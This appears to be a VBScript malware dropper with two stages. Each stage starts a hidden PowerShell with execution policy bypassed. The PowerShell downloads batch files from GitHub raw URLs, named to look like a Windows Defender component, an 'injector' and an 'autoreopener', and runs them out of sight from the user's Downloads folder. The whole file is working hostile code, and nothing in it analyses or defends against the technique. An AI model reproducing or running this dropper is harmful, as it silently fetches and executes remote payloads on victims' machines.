Set WshShell = CreateObject("WScript.Shell")

downloads = WshShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads")

' --- FIRST STAGE ---
pscom = _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexinject/windows/main/windowsdef.bat' -OutFile ""$env:TEMP\windowsdef.bat""; " & _
    "Set-Location '" & downloads & "'; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' -FilePath ""$env:TEMP\windowsdef.bat"" -Wait;"

cm = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & Chr(34) & pscom & Chr(34)
WshShell.Run cm, 0, True



' --- SECOND STAGE ---
psCommand = _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/inh.bat' -OutFile ""$env:TEMP\inh.bat""; " & _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/autoreopener.bat' -OutFile ""$env:TEMP\autoreopener.bat""; " & _
    "Set-Location '" & downloads & "'; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' -FilePath ""$env:TEMP\inh.bat"" -Wait; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' -FilePath ""$env:TEMP\autoreopener.bat"";"

cmd = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & Chr(34) & psCommand & Chr(34)
WshShell.Run cmd, 0, True
